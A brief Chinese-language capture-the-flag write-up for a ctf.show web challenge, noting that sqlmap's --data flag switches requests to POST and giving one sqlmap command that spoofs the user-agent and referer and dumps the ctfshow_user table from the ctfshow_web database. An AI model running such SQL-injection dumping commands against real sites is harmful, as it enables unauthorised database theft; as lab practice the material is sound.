# 知识点
#### sqlmap的使用
加入 --data参数转换请求方式为post
# 思路
```bash
ython sqlmap.py -u http://3702c6fc-0dca-4e2b-aa95-dc334b33eebd.challenge.ctf.show/api/ --data 'id=1' --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump 
```
